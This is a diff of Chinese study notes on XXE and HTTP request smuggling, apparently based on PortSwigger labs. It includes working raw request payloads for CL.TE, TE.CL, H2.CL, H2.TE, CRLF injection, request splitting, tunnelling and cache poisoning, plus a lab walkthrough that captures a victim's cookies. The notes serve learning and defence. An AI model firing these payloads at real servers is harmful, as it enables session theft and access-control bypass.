 XML 实体是一种在 XML 文档中表示数据项的方式，不是数据本身。XML 规范中定义了一些内建的实体，例如 实体 `&lt` 和 `&gt` 分别表示字符 `<` 和 `>`，这些是用于表示 XML 标签的元字符，当他们出现在数据中时，通常必须使用它们的实体来表示。  
 
@@ -3350,7 +3356,7 @@ XML 文档类型定义(Document Type Definition,DTD)包含了一个 XML 中可�
 
 
 
-#### 自定义实体
+### 自定义实体
 
 XML 允许自定义实体，例如
 
@@ -3362,7 +3368,7 @@ XML 允许自定义实体，例如
 
 
 
-#### 外部实体
+### 外部实体
 
 XML 外部实体是指定义在 xml 外部的自定义实体类型。使用 `SYSTEM` 关键字并指定一个 URL 来声明外部自定义实体。     
 
@@ -3384,7 +3390,7 @@ XML 外部实体是指定义在 xml 外部的自定义实体类型。使用 `SYS
 
 
 
-### XXE 攻击类型
+## XXE 攻击类型
 
 * 利用 XXE 获取文件，当一个外部实体的定义中包含文件内容，并从应用响应返回。
 * 利用 XXE 执行 SSRF 攻击，当一个外部实体的定义基于 URL。
@@ -3393,7 +3399,7 @@ XML 外部实体是指定义在 xml 外部的自定义实体类型。使用 `SYS
 
 
 
-### 利用 XXE 获取文件
+## 利用 XXE 获取文件
 
 可以通过两种方式：
 
@@ -3430,7 +3436,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 
 
 
-### 利用 XXE 执行 SSRF 攻击
+## 利用 XXE 执行 SSRF 攻击
 
 如果应用程序中引用了 URL 的方式，就可以被利用来发起 SSRF。  
 
@@ -3444,13 +3450,13 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 
 
 
-### 盲 XXE
+## 盲 XXE
 
 很多应用程序不会在 response 中包含定义的外部实体的值，这种场景下直接获取文件将行不通，但盲 XXE 还是能够被利用，有时需要结合一些带外技术或者导致触发解析错误的手段。
 
   
 
-#### 使用 OAST 探测盲 XXE
+### 使用 OAST 探测盲 XXE
 
 定义一个外部实体：
 
@@ -3486,7 +3492,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 
 
 
-#### 利用盲 XXE 经 OAST 携带数据
+### 利用盲 XXE 经 OAST 携带数据
 
  上一节是检测盲 XXE 漏洞，攻击者真正想要利用该盲 XXE 漏洞外泄敏感数据，还需要一些步骤，要在攻击者控制的系统上放置一个恶意 DTD，然后从带内 XXE Payload 中调用该外部 DTD。  
 
@@ -3545,7 +3551,7 @@ DTD 中一些替代的字符编码
 
 
 
-#### 盲 XXE 经错误消息获取数据
+### 盲 XXE 经错误消息获取数据
 
 有些时候应用程序没有在 response 中返回文件数据，但 XML 解析错误消息中可能会包含文件数据，如果 response 中包含错误消息就可以被利用来获取数据。  
 
@@ -3578,7 +3584,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 
 
 
-#### 利用本地 DTD 
+### 利用本地 DTD 
 
 很多时候无法调用外部 DTD，但如果知道目标服务器上存在一些已知的 DTD，这些 DTD 就可以被利用。  
 
@@ -3622,11 +3628,11 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 
 
 
-### 找到隐藏攻击面
+## 找到隐藏攻击面
 
 如果应用程序正常在 HTTP 流量中包含 XML 数据，这种场景如果存在 XXE 将会比较明显。但有些场景不是像这样明显的交互。  
 
-#### XInclude 攻击
+### XInclude 攻击
 
 有些场景下应用程序接收到客户端数据之后，在服务端才嵌入到一个 XML 文档中，然后进行解析。例如客户端提交的数据存放到一个后端 SOAP 请求中，由后端 SOAP 服务处理。  
 
@@ -3641,7 +3647,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 
 
 
-#### 通过文件上传进行 XXE
+### 通过文件上传进行 XXE
 
 一些应用程序允许用户上传文件，然后在服务端处理。有一些常见的文件格式使用或包含了 XML 文档格式，例如 DOCX、SVG。  
 
@@ -3649,7 +3655,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 
 
 
-#### 修改上下文类型
+### 修改上下文类型
 
 大多数 POST 请求使用 HTML 表单生成的默认类型，例如 `application/x-www-form-urlencoded` ，有些网站会允许其它内容类型，例如 XML。  
 
@@ -3677,7 +3683,7 @@ Content-Length: 52
 
 
 
-#### 快速发现和测试 XXE 漏洞
+### 快速发现和测试 XXE 漏洞
 
 大多数 XXE 可以使用 web 漏洞扫描器发现。  
 
@@ -3693,7 +3699,7 @@ Content-Length: 52
 
 
 
-### 预防
+## 预防
 
 禁用那些用不到的 XML 危险特性，通常禁用外部实体解析和对 XInclude 的支持就足够，参考每种实现库和API的文档。
 
@@ -3701,11 +3707,11 @@ Content-Length: 52
 
 
 
-## HTTP Request Smuggling (HTTP 请求走私)
+# HTTP Request Smuggling (HTTP 请求走私)
 
 
 
-### 概念
+## 概念
 
 HTTP 请求走私是一种干涉web服务器处理正常用户发起的 HTTP 请求序列的技术，攻击者可能穿过安全机制，访问到未授权的敏感数据。  主要与 HTTP/1 有关。   
 
@@ -3758,9 +3764,22 @@ HTTP/1 中提供了两种不同的方法声明消息的长度，但一条消息�
 
 
 
+一些缩写：
+
+```
+CL (Content-Length)
+TE (Transfer-Encoding)
+0 (Implicit-zero)
+H2 (HTTP/2's built-in length)
+```
 
 
-### 执行攻击
+
+
+
+
+
+## 执行攻击
 
 经典的请求走私攻击会在单个 HTTP/1 的请求中包含 `Content-Length` 和 `Transfer-Encoding` 两种 header ，控制他们进而导致前后端处理请求的差异，具体的方式取决于前后端服务器的差异，下面 CL 、TE 分别代表两种 header：
 
@@ -3770,7 +3789,7 @@ HTTP/1 中提供了两种不同的方法声明消息的长度，但一条消息�
 
 
 
-#### CL.TE
+### CL.TE
 
 
 
@@ -3793,7 +3812,7 @@ SMUGGLED
 
 
 
-#### TE.CL
+### TE.CL
 
 ```http
 POST / HTTP/1.1
@@ -3816,7 +3835,7 @@ SMUGGLED
 
 
 
-#### TE.TE
+### TE.TE
 
 前后端都支持 TE 头，但其中一个服务器会被某种混淆头诱导从而不处理该头，一些常见的混淆头
 
@@ -3847,13 +3866,13 @@ Transfer-Encoding
 
 
 
-### 识别漏洞
+## 识别漏洞
 
 大多数探测识别 HTTP 请求走私漏洞的技术是发送导致延迟响应。
 
 
 
-#### CL.TE
+### CL.TE
 
 对于 CL.TE 类型的漏洞，可以通过发送类似如下请求：
 
@@ -3872,7 +3891,7 @@ X
 
 
 
-#### TE.CL
+### TE.CL
 
 对于 TE.CL 类型的漏洞，可以通过发送类似如下请求：
 
@@ -3917,7 +3936,7 @@ Content-Length: 11
 q=smuggling
 ```
 
-#### **CL.TE**  
+### **CL.TE**  
 
 发送类似如下请求来确认 CL.TE 类型的漏洞：
 
@@ -3952,7 +3971,7 @@ q=smuggling
 
 
 
-#### **TE.CL**  
+### **TE.CL**  
 
 发送类似如下请求来确认 TE.CL 类型漏洞：
 
@@ -4000,13 +4019,13 @@ q=smuggling
 
 
 
-### 利用
+## 利用
 
 http 请求走私可以被利用的地方取决于漏洞所在的功能模块。
 
 
 
-#### 绕过前端安全控制策略
+### 绕过前端安全控制策略
 
 一些应用在web前端服务器实施某些安全控制，决定是否允许处理单个请求，通过这些安全控制策略后再被转发到后端服务器。  
 
@@ -4035,7 +4054,7 @@ Host: vulnerable-website.com
 
 
 
-#### 揭示前端请求重写
+### 揭示前端请求重写
 
 很多应用在前端服务器中会修改重写请求，然后再转发给后端服务器，通常是添加一些请求 header，例如：
 
@@ -4111,7 +4130,7 @@ x-nr-external-service: external
 
 
 
-#### 绕过客户端认证
+### 绕过客户端认证
 
 作为 TLS 握手的一部分，服务器提供证书向客户端证明自己。证书包含了 CN（Common Name），客户端验证这里的 CN 和正在访问的域名匹配。  
 
@@ -4149,7 +4168,7 @@ Foo: x
 
 
 
-#### 捕获其它用户请求
+### 捕获其它用户请求
 
 如果应用中包含任何允许存储并检索文本数据地功能，就存在潜在的可以被利用捕获其它用户的数据。这些内容可能是令牌、用户的敏感数据。适合作为攻击载体的功能：评论、邮件、个人资料、屏幕名称等。  
 
@@ -4232,7 +4251,7 @@ csrf=wcIVun0Q5bb19dhlXc3ka5nYjUfA0KNd&postId=1&name=carlos&email=h%40i.j&website
 
 
 
-#### 利用反射型 XSS
+### 利用反射型 XSS
 
 如果一个应用有请求走私漏洞，同时还有反射型 XSS漏洞，就可以利用请求走私攻击来使应用中的其他用户触发 XSS，这种方法比常规反射型 XSS 的优势有：
 
@@ -4260,7 +4279,7 @@ Foo: X
 
 
 
-#### 转换站内重定向为开放重定向
+### 转换站内重定向为开放重定向
 
 很多应用程序执行从一个 URL 到另一个 URL 的站内重定向，并将 Host 头中的主机名放到重定向 URL 中。Apache、IIS 等 Web 服务器的默认行为：对不带尾部斜杠的文件夹的请求，会收到一个重定向，指向包含尾部斜杠的同一文件夹（Nginx 的配置`server_name_in_redirect` 默认是 `On`，如果被显式设置为 `off` 也会如此）：
 
@@ -4369,87 +4388,1099 @@ GET //attacker-website.com/example → Location: //attacker-website.com/example/
 
 
 
-#### Web 缓存投毒
+### Web 缓存投毒
 
+类似前面攻击形式的还有一种变体，可能利用 http 请求走私造成 web 缓存投毒攻击。如果前端基础设施出与性能等原因考虑，部分执行内容缓存，就有可能利用站外重定向 response 来向缓存投毒。这种攻击会持久化到缓存中，影响后续请求的用户。  
 
+假设攻击者向服务端发送如下请求：
 
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 59
+Transfer-Encoding: chunked
 
+0
 
-#### Web 缓存欺骗
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
+```
 
+走私的请求到达后端服务，后端服务器像之前一样执行站外重定向的 response 返回。前端服务器将这个 response 内容缓存到所认为的第二个请求(/static/include.js)中的 URL 中：
 
+```http
+GET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
 
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+```
 
+后续用户请求此 URL 时，将会收到攻击者网站的重定向。  
 
 
 
 
 
-### 高级请求走私
+### Web 缓存欺骗
 
+另一个变体是 Web 缓存欺骗。  
 
+web 缓存投毒和 web 缓存欺骗的区别：
 
-#### HTTP/2 请求走私
+* web 缓存投毒是攻击者引起应用程序存储一些恶意上下文到缓存中，其他用户会受到缓存中的恶意上下文影响
+* web 缓存欺骗是攻击者引起应用程序存储一些其他用户的敏感信息到缓存中，攻击者从缓存中检索这些信息
 
 
 
+示例，攻击者构造一个走私请求包含了获取用户隐私信息：
 
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 43
+Transfer-Encoding: chunked
 
-#### Response 队列偷渡
+0
 
+GET /private/messages HTTP/1.1
+Foo: X
+```
 
+下一个用户的请求 png 资源，被追加转发到后端服务器，包含了 session 、cookie 等信息，如下：
 
+```http
+GET /private/messages HTTP/1.1
+Foo: XGET /static/some-image.png HTTP/1.1
+Host: vulnerable-website.com
+Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
+...
+```
 
+后端将该消息作为正常请求处理，返回包含个人隐私信息的内容，前端服务器将 response 作为第二个 URL 请求的缓存，这里是 `/static/some-image.png` ：
 
+```http
+GET /static/some-image.png HTTP/1.1
+Host: vulnerable-website.com
 
+HTTP/1.1 200 Ok
+...
+<h1>Your private messages</h1>
+...
+```
 
+攻击者再访问该 URL 就能获取到敏感信息。  
 
+不过这里攻击者不能提前直到受害者样访问的 URL 资源，因此需要大量检索静态资源 URL 以获取内容。  
 
-#### HTTP/2 请求分割
 
 
 
 
+## 高级请求走私
 
 
 
-#### HTTP 请求隧道
+### HTTP/2 请求走私
 
+HTTP/2 有时反而让网站更容易遭受请求走私攻击。  
 
+#### HTTP/2 消息长度
 
+请求走私从根本上讲是利用不同服务器之间对长度解析的差异。HTTP/2 引入了一种单一的、稳健的机制，一直被认为对请求走私免疫。  
 
+HTTP/2 消息是以一系列“帧”发送，每个帧前面有一个显式的长度字段，告诉服务器读取多少字节。因此请求的长度是帧长度的总和。     
 
-#### 0.CL 请求走私
+理论上这种机制是没有机会引入请求走私所需的歧义，但是协议降级会导致这种情况。  
 
+#### HTTP/2 降级
 
+HTTP/2 降级是使用 HTTP/1 的语法重写 HTTP/2 请求以生成等效的 HTTP/1 请求。Web服务器和反向代理服务器经常处于这个位置，向客户端提供 HTTP/2 支持，重写后转发到仅支持 HTTP/1 的后端服务器。
 
 
 
+#### HTTP/2 消息表示说明
 
+由于 HTTP/2 是二进制协议，BurpSuite 在文章中使用了一些人类可读形式表示 HTTP/2消息：
 
+* 每条消息显示为单个实体，而不是独立“帧”
+* 使用纯文本和值字段显示头部
+* 在伪头部名称前加上冒号，以区别普通头部
 
+但在真实传输中消息并非这种形式。  
 
-### 基于浏览器的请求走私
 
 
+一些说明：
 
-#### CL.0 请求走私
+* 换行符、冒号等字符在 HTTP/2 请求中没有特殊含义，并且可以以 HTTP/1 中不可能的方式注入。
+* 伪头部，几个伪头部有效地取代了 HTTP/1 的请求行和状态行，共有五个伪头部
+  * `:method` - 请求的 HTTP 方法，如 GET 或 POST。
+  * `:path` - 请求路径。注意这包括查询字符串。
+  * `:authority` - 大致相当于 HTTP/1 中的 Host 头。
+  * `:scheme` - 请求方案，通常是 http 或 https。注意在 HTTP/1 中没有等价物。
+  * `:status` - 响应状态码。
+  * 在真实传输线路上，这些名称只是二进制字节，实际上并不包含冒号，这只是以人类可读格式呈现此信息的一种方式
 
 
 
+#### H2.CL 漏洞
 
+HTTP/2 无需在头部中指定长度。但在降级期间，前端服务器通常会添加一个 HTTP/1 的 `Context-Length` 头，使用 HTTP/2 的内置长度机制推导长度值。HTTP/2 也可以包含 `Context-Length` 头，有些前端服务器会简单的复用该值。  
 
-#### 客户端反同步攻击
+HTTP/2 规范规定请求中的任何 `Context-Length` 头必须与使用内置计算机制的长度匹配，但是在降级之前并不是总做验证。前端使用 HTTP/2 中隐式的长度确定请求的结束位置，但是 HTTP/1 后端必须使用我们注入的 CL 头，从而导致反同步。  
 
+示例，前端 HTTP/2：
 
+```http
+:method	POST
+:path	/example
+:authority	vulnerable-website.com
+content-type	application/x-www-form-urlencoded
+content-length	0
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
 
+x=1
+```
 
+后端 HTTP/1：
 
+```http
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
 
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
 
+x=1GET / H
+```
 
+注：在执行某些请求走私时，你希望追加受害者的头部到走私前缀上，但是一些情况下这些头部会干扰攻击，导致头部重复之类的问题。上面示例使用在走私前缀包中包含一个尾随参数和一个 `Context-Length` 头缓解该问题。通常使用一个比正文稍长的 `Context-Length` 头，受害者请求头仍会被追加到你的走私前缀上，但会在头部之前被截断。  
 
-### 预防
+
+
+
+
+#### H2.TE 漏洞
+
+HTTP/2 不兼容分块传输编码，任何注入的 `Transfer-encoding: chunked` 头都应该被剥离，或者完全阻止请求。  
+
+如果前端服务器未实现拒绝或剥离分块传输编码，就会存在 H2.TE 请求走私攻击。  
+
+示例，前端 HTTP/2 ：
+
+```http
+:method	POST
+:path	/example
+:authority	vulnerable-website.com
+content-type	application/x-www-form-urlencoded
+transfer-encoding	chunked
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: bar
+```
+
+后端 HTTP/1：
+
+```http
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: bar
+```
+
+
+
+
+
+#### 隐藏 HTTP/2 支持
+
+浏览器和一些客户端通常只使用 HTTP/2 和那些在 TLS 握手期间通过 ALPN 明确宣称支持它的服务器通信。  
+
+一些服务器支持 HTTP/2 ，但由于配置错误等原因未能声明，因此客户端会回退到 HTTP/1 ，这是很多客户端软件的默认行为。但可能测试需要强制 HTTP/2 。  
+
+强制 BurpSuite 使用 HTTP/2 ：
+
+1. 在设置对话框中，转到 Tools > Repeater。
+2. 在 Connections 下，启用 Allow HTTP/2 ALPN override 选项。
+3. 在 Repeater 中，转到 Inspector 面板并展开 Request attributes 部分。
+4. 使用开关将 Protocol 设置为 HTTP/2。Burp 现在将在此选项卡上使用 HTTP/2 发送所有请求，无论服务器是否宣称支持它。  
+
+
+
+
+
+### Response 队列投毒
+
+响应队列投毒是请求走私中一种强大的攻击形式，会导致前端服务器开始将来自后端的响应映射到错误的请求上。  
+
+通过走私一个完整的请求，从而实现后端期望一个响应时，引出两个响应。  
+
+#### 影响
+
+一旦队列被投毒，攻击者只要发出任意后续请求，就可以捕获到其它用户的请求响应。可能包含用户敏感数据、业务数据、会话令牌等。可能导致攻击者获取受害者账户的完全控制权。     
+
+
+
+#### 构造队列投毒攻击
+
+实施响应队列投毒，需要满足如下条件：
+
+* 前端服务器和后端服务器之间的 TCP 被多个请求/响应周期性复用。
+* 攻击者能够成功走私一个完整的、独立的请求，该请求从后端服务器收到自己独立的响应。
+* 攻击不会导致任一服务器关闭 TCP 连接，因为无法确认请求应在何处结束，服务器通常在收到无效请求时关闭连接。
+
+
+
+**后果**  
+
+请求走私通常涉及走私一个部分请求，服务器将其作为前缀添加到下一个请求的开头。走私请求的内容会影响初始攻击之后连接上发生的事情。  
+
+![image-20261102185723866](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261102185723866.png)
+
+如果只走私一个请求行和一些头部，假设连接上不久之后又发送另一个请求，后端最终会看到两个完整的请求。  
+
+如果改为走私一个包含请求体的请求，连接上下一个请求将被追加到请求走私的请求体上。通常会产生根据 CL 头截断最终请求的副作用。后端实际看到三个请求，其中第三个请求只是一系列剩余字节，如下所示：     
+
+前端（CL）：
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 120
+Transfer-Encoding: chunked
+
+0
+
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 25
+
+x=GET / HTTP/1.1
+Host: vulnerable-website.com
+```
+
+后端（TE）：
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 120
+Transfer-Encoding: chunked
+
+0
+
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 25
+
+x=GET / HTTP/1.1
+Host: vulnerable-website.com
+```
+
+由于第三个请求不构成有效请求，通常会导致错误，服务器关闭连接。  
+
+如果稍加注意，走私一个完整的请求，一次恰好发送两个请求，连接上的任何后续请求都将保持不变：  
+
+前端（CL）：
+
+```http
+POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Content-Type: x-www-form-urlencoded\r\n
+Content-Length: 61\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+GET /anything HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+GET / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+```
+
+后端（TE）：
+
+```http
+POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Content-Type: x-www-form-urlencoded\r\n
+Content-Length: 61\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+GET /anything HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+GET / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+```
+
+没有无效请求，攻击后的连接仍应保持开放。  
+
+
+
+#### Desynchronizing the response queue 脱同步
+
+当走私一个完整请求时，前端服务器仍认为之转发了一个请求，后端看到两个完整请求，会发送两个完整响应：
+
+![image-20261102185756892](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261102185756892.png)
+
+前端正确地将第一个响应映射到最初的“包装”请求，并将其转发给客户端。由于没有其它请求在等待响应，该响应会被保存在前端和后端连接上的一个队列中。  
+
+当前端收到另一个请求，会将其转发给后端，然而在发送响应时会发送队列中第一个响应，即走私请求对应的响应。  
+
+来自后端的正确响应没有匹配的请求，每次通过一个连接向前端转发新请求时，这个循环都会重复。  
+
+
+
+
+
+#### 窃取其他用户的响应
+
+一旦响应队列被投毒，攻击者只要发送也给任意请求，就可以捕获另一个用户的请求响应。  
+
+![image-20261102190442102](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261102190442102.png)
+
+攻击者无法控制收到哪些响应，因为他们总是被发送队列中的下一个响应，即对应上一个用户请求的响应。利用 Trunder 之类的自动化工具，攻击者可以轻松的重复这个过程，抓取一些用户的响应信息，进而从中获取有用的信息。     
+
+只要前端/后端连接保持开放，攻击者就可以持续窃取响应。连接的关闭时间因服务器而异，常见的默认值是处理完 100 个请求后终止，但攻击者可以重新投毒一个新的连接继续窃取。  
+
+
+
+注：为了区分窃取的响应和自己的请求，可以尝试在发送的两个请求都使用不存在的路径，这样你的请求都会一致的收到 404 之类的响应。  
+
+
+
+
+
+
+
+### CRLF 注入
+
+尽管网站预防基础的 H2.CL 或者 H2.TE 注入，采取例如验证 CL 头、剥离 TE 头等手段。但是 HTTP/2 的二进制形式开启了一些新型的绕过前端服务器的机制。  
+
+HTTP/1 中，有时可以利用服务器处理 `\n` 换行符之间的差异注入走私的头部，例如后端识别 `\n` 为分隔符，但前端不将其视为 header 分隔符，有些前端就无法检测到第二个header：
+
+```http
+Foo: bar\nTransfer-Encoding: chunked
+```
+
+但这种差异在 `CLRF(\r\n)` 序列时并不存在，因为所有服务器都支持这种分隔符。  
+
+由于 HTTP/2 是基于二进制而非文本的，每个头部的边界基于显式、预定的偏移量，而不是分隔符，因此 `\r\n` 这种在头部中不具有特殊意义，不会被分割：
+
+```http
+foo: bar\r\nTransfer-Encoding: chunked
+```
+
+当被重写为 HTTP/1 请求时，`\r\n` 将再次被解释为分隔符，HTTP/1 的后端服务器将看到两个 header：
+
+```http
+Foo: bar
+Transfer-Encoding: chunked
+```
+
+
+
+portswigger 实验可以通过修改邮箱功能获取：
+
+使用 wiener 用户登录。  
+
+找一个POST请求，发送到 repeater，在 inspector 中增加一个 header `foo` ，填入下面的值(回车需要 Shift+Return 输入)：
+
+```http
+bar
+Transfer-Encoding: chunked
+```
+
+body 部分：
+
+```http
+0
+
+POST /my-account/change-email HTTP/1.1
+Host: 0a8e00580325e063807f3af8008800f4.web-security-academy.net
+Cookie: session=970VaAzitHKF01p7Zkicsf6biZF9Dqmx
+Content-Length: 1044
+
+csrf=MgvJ57uHjYRu24ooa7h40ir6zNmZ4HH9&email=ddd@eee.fffff
+```
+
+随后在 wiener 的主页可以看到信息：
+
+```text
+Your username is: wiener
+
+Your email is: g@h.iGET / HTTP/1.1 Host: 0a8e00580325e063807f3af8008800f4.web-security-academy.net sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: "Linux" upgrade-insecure-requests: 1 user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 sec-fetch-site: none sec-fetch-mode: navigate sec-fetch-user: ?1 sec-fetch-dest: document accept-encoding: gzip, deflate, br, zstd accept-language: en-US,en;q=0.9 priority: u=0, i cookie: victim-fingerprint=BNfRyJHxkWsBFENck6gYJtEG8413R6Nf; secret=c725dAnH2RYtcVyiUF3TQ77mALwz3KSW; session=STdYYllu2hxpvBVY070CZjeNCi2H82Nj; _lab_analytics=JFzRsRqzPK8o2xLiBgofPp6fqqt2enQILdH71HbTNzN1DrWLko8TGU7ZH2MGxs2olswkJ8bjzKvvaX9p1d8dFw6Jrv3YzjcW0WID9MDoeA9pkKnlcrrGAejG1bfZ70zbDSFNBo52AbjeXXwcyuUDURE
+
+```
+
+
+
+官方的使用 search 缓存功能更简洁，这个邮箱修改还需要获取 csrf 值。  
+
+
+
+### HTTP/2 请求分割
+
+前面在响应队列中分割请求时，都是在消息内部中进行拆分。但当存在 HTTP/2 降级时，也可以让拆分发生在 HTTP 的 header 中。  
+
+这种方法更通用，不依赖使用允许包含请求体的请求方法。例如甚至可以使用 GET 请求：
+
+```http
+:method	GET
+:path	/
+:authority	vulnerable-website.com
+foo	
+bar\r\n
+\r\n
+GET /admin HTTP/1.1\r\n
+Host: vulnerable-website.com
+```
+
+这在 `Content-Length` 被验证且后端不支持 TE 分块编码的情况下也可以使用。     
+
+要在请求头拆分，需要了解前端如何重写请求，在手动添加 HTTP/1 头部时添加上那些必要的头部。  
+例如需要确保后端收到的每个请求都包含 `Host` 头，前端服务器通常在降级前剥离 `:Authority` 伪头部，并用新的 HTTP/1 的 `Host` 头替换它。有不同的实现方法，因此在注入时需要根据情况将 `Host` 头放在不同位置。  
+
+示例：
+
+```http
+:method	GET
+:path	/
+:authority	vulnerable-website.com
+foo	
+bar\r\n
+\r\n
+GET /admin HTTP/1.1\r\n
+Host: vulnerable-website.com
+```
+
+在重写过程中，一些前端服务器会将新的 `Host` 头追加到当前头部列表的末尾。对于上面的请求是在 foo 的后面，这样将位于后端拆分点之后，第一个请求将完全没有 `Host` 头。这种情况下需要调整注入的 `Host` 的位置，将其落入拆分后第一个请求中：
+
+```http
+:method	GET
+:path	/
+:authority	vulnerable-website.com
+foo	
+bar\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+GET /admin HTTP/1.1
+```
+
+其它类似的情况也是需要调整 header 的位置适配请求拆分。  
+
+
+
+
+
+### HTTP 请求隧道
+
+之前的请求走私都是基于前端和后端之间的同一连接处理多个请求。  
+
+一些安全策略严格的服务器只允许来自相同 IP 或相同客户端的请求重用连接，这就限制了使用前述请求走私所能实现的目标，没有明显的方式来影响其它用户流量。        
+
+![image-20261103115842242](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103115842242.png)
+
+
+
+虽然无法毒化套接字干扰其他用户的请求，但仍然可以通过发送一个会从后端引出两个响应的单一请求。这样能够完全对前端隐藏一个请求及匹配的响应。  
+
+![image-20261103120111582](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103120111582.png)
+
+这种技术可以绕过前端的安全措施，以这种方式将请求隧道到后端，这是一种有限的请求走私形式，但仍然存在高度的可利用性。  
+
+
+
+#### HTTP/2 请求隧道
+
+请求隧道在 HTTP/1、HTTP/2 中都存在，但在 HTTP/1 的环境检测难度较高。由于 HTTP/1 中的 keep-alive 连接的工作方式，即使收到两个响应，也不能确认请求被成功走私。  
+
+在 HTTP/2 中，每个“流”都应该只包含一个请求和响应，如果收到一个 HTTP/2 响应，其中响应体看起来包含一个 HTTP/1 响应，就可以确认已经成功隧道到第二个请求。  
+
+
+
+
+
+#### 请求隧道泄露内部 header
+
+当仅能使用请求隧道时，无法使用前面的技术泄露内部头，但通过 HTTP/2 降级出现一种方案。  
+
+需要诱骗前端服务器将内部头追加到发往后端的请求体中，例如我们发送一个如下请求：
+
+```http
+:method	POST
+:path	/comment
+:authority	vulnerable-website.com
+content-type	application/x-www-form-urlencoded
+foo	
+bar\r\n
+Content-Length: 200\r\n
+\r\n
+comment=
+
+x=1
+```
+
+此请求中前后端都认为只有一个请求，但可以使他们在头部结束的位置产生分歧。  
+
+前端将注入的请求视作是头部的一部分，因此在尾随的 `comment=` 字符串之后添加任何新的头部。而后端看到 `\r\n\r\n` 序列，认为是头部结束标志， `comment=` 字符串连同内部头都被认为是请求体的一部分。结果就是一个 `comment` 参数，值是内部请求头的内容。  
+
+```http
+POST /comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+
+comment=X-Internal-Header: secretContent-Length: 3
+x=1
+```
+
+
+
+#### 盲请求隧道
+
+一些前端服务器会读取从后端收到的所有数据，这样如果成功隧道到一个请求，可能会将两个响应都转发到客户端，隧道请求的响应被嵌入到主响应的 body 中。  
+
+其它服务器只读取响应 `Content-Length` 头中指定的字节数，因此只有第一个被转发给客户端。这样由于无法看到隧道请求的响应，就属于盲请求隧道漏洞。  
+
+
+
+#### 使用 HEAD 的非盲请求隧道
+
+盲请求隧道难以利用，但偶尔可以通过 HEAD 请求走私将这些漏洞变为非盲。  
+
+对于 HEAD 请求的响应通常包含 `Content-Length` 头，即使没有请求体。这个长度通常指的是对同一端点进行 GET 请求将返回的资源长度。一些前端服务器会尝试读取 header 中指定的字节数，这种操作可能导致过度读取后端的响应，这样就会收到隧道请求响应开头的字节。  
+
+请求：
+
+```http
+:method	HEAD
+:path	/example
+:authority	vulnerable-website.com
+foo	
+bar\r\n
+\r\n
+GET /tunnelled HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+X: x
+```
+
+响应：
+
+```http
+:status	200
+content-type	text/html
+content-length	131
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 4286
+
+<!DOCTYPE html>
+<h1>Tunnelled</h1>
+<p>This is a tunnelled respo
+```
+
+这样属于将一个响应的 `Content-Length` 头和另一个响应的 body 混合在一起，因此需要一些平衡技巧。      
+
+如果 HEAD 请求的端点返回的资源比你要读取的隧道响应短，可能会在看到所需数据之前被截断。而如果返回的 `Content-Length` 比隧道请求的响应长，前端等待后续字节，可能会超时。  
+
+通过一些试错可以尝试下列解决方案克服问题：
+
+* 将 HEAD 请求指向一个根据需要返回更长或更短资源的不同端点
+* 如果资源太短，在主 HEAD 请求中使用反射输入来注入任意的填充字符。即使实际上看不到你的输入被反射，返回的 `Content-Length` 仍然会相应的增加。
+* 如果资源太长，在隧道请求中使用反射输入来注入任意字符，使隧道响应的长度匹配或超过预期内容的长度。
+
+
+
+
+
+#### HTTP/2 请求隧道实验
